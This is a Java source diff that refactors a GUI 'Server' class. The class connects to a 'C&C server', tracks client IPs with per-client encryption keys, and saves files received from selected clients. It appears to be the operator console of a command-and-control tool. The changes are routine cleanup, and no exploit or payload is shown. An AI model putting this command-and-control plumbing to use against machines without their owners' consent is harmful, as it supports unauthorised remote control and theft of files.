@@ -2,48 +2,25 @@ package model;
 
 import static model.MessageState.*;
 import java.awt.Color;
-import java.io.BufferedReader;
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
 import java.security.InvalidKeyException;
-import java.security.KeyFactory;
-import java.security.KeyPair;
-import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
-import java.security.PrivateKey;
-import java.security.PublicKey;
-import java.security.spec.X509EncodedKeySpec;
-import java.util.ArrayList;
-import java.util.Collections;
 import java.util.HashMap;
 import java.util.HashSet;
-import java.util.List;
 import java.util.Map;
 import java.util.Set;
-import java.util.concurrent.ArrayBlockingQueue;
-import java.util.concurrent.BlockingQueue;
-import java.util.concurrent.ConcurrentHashMap;
-
-import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
 import javax.crypto.CipherOutputStream;
-import javax.crypto.IllegalBlockSizeException;
-import javax.crypto.KeyAgreement;
 import javax.crypto.NoSuchPaddingException;
-import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
-
-import com.sun.org.apache.regexp.internal.RE;
 
 import view.GUI;
 
@@ -82,7 +59,7 @@ public class Server {
   private InputStream in;
   private PrintWriter out;
   private CipherInputStream cin;
-  private CipherInputStream cin2;
+  private CipherInputStream relayServerCipherInputStream;
   private CipherOutputStream cout;
   private String filename;
   private FileOutputStream fos;
@@ -91,27 +68,23 @@ public class Server {
   public Server() {
     gui = new GUI(this);
     gui.setVisible(true);
-    //    clients = new HashSet<InetAddress>();
     clientsAndKeys = new HashMap<InetAddress, ClientConnection>();
     selectedClients = new HashSet<InetAddress>();
 
     try {
       consoleMessage("Attempting to connect to the C&C server...", Color.WHITE);
       s = new Socket(InetAddress.getByName(SERVER_IP), PORT_NUMBER);
-      //      byte[] keyBytes = new byte[KEY_LENGTH];
-      //      //      s.getInputStream().read(keyBytes, 0, 16);
-      //
-      //      SecretKey key = new SecretKeySpec(keyBytes, CIPHER_ALGORITHM);
+
       Cipher decrypt;
       decrypt = Cipher.getInstance(CIPHER_IMPLEMENTATION);
       decrypt.init(Cipher.DECRYPT_MODE, new SecretKeySpec(RELAY_SERVER_KEY, CIPHER_ALGORITHM));
 
       in = s.getInputStream();
-      cin2 = new CipherInputStream(in, decrypt);
-
       out = new PrintWriter(s.getOutputStream(), true);
+      relayServerCipherInputStream = new CipherInputStream(in, decrypt);
+
       consoleMessage("Connected successfully to the C&C server", Color.GREEN);
-    } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
+    } catch (IOException e) {
       consoleMessage("Could not connect to the C&C server. It may be offline", Color.RED);
       consoleMessage("Exiting program in 10 seconds...", Color.RED);
       new Thread() {
@@ -125,6 +98,12 @@ public class Server {
           System.exit(1);
         };
       }.start();
+    } catch (NoSuchAlgorithmException e) {
+      e.printStackTrace(); // can't happen unless algorithm constant changes
+    } catch (NoSuchPaddingException e) {
+      e.printStackTrace();
+    } catch (InvalidKeyException e) {
+      e.printStackTrace();
     }
 
     new Thread() {
@@ -138,7 +117,6 @@ public class Server {
         int length = 0;
         byte[] bytes = null;
         String toIp = "";
-        String fromIp = "";
         byte[] ipList = null;
 
         try {
@@ -176,9 +154,7 @@ public class Server {
 
               if (character == '!') {
                 state = GETTING_LENGTH;
-              } else {
-                fromIp += (char)character;
-              }
+              } // we don't care about the from IP from this program, so no need to save it
             } else if (state == GETTING_LENGTH) {
               if ((character = in.read()) == -1) break;
 
@@ -231,11 +207,6 @@ public class Server {
             } else if (state == RECEIVING_DATA) {
               length = cin.read(bytes, offset, messageLength - offset);
 
-              //              for (int i = 0; i < messageLength; ++i) {
-              //                System.out.print((char)bytes[i]);
-              //              }
-              //              System.out.println();
-
               try {
                 fos.write(bytes, offset, length);
               } catch (FileNotFoundException e) {
@@ -253,12 +224,11 @@ public class Server {
                 messageLength = 0;
                 messageType = 0;
                 toIp = "";
-                fromIp = "";
                 ipList = null;
               }
             } else if (state == UPDATING_IPS) {
               if (messageLength-- > 0) {
-                if ((character = in.read()) == -1) break;
+                if ((character = relayServerCipherInputStream.read()) == -1) break;
                 ipList[ipList.length - messageLength - 1] = (byte)character;
               } else {
                 // parse string into (IP address, encryption key) pairs and put them into map
@@ -292,14 +262,6 @@ public class Server {
                   }
                 }
 
-                //                String[] ipStrings = ipList.split(",");
-                //                clients.clear();
-                //                for (String s : ipStrings) {
-                //                  if (s != null && !s.isEmpty()) {
-                //                    clients.add(InetAddress.getByName(s));
-                //                  }
-                //                }
-
                 gui.updateClients(clientsAndKeys.keySet());
                 updateSelectedClients();
 
@@ -308,7 +270,6 @@ public class Server {
                 messageLength = 0;
                 messageType = 0;
                 toIp = "";
-                fromIp = "";
                 ipList = null;
               }
             } else if (state == null) {
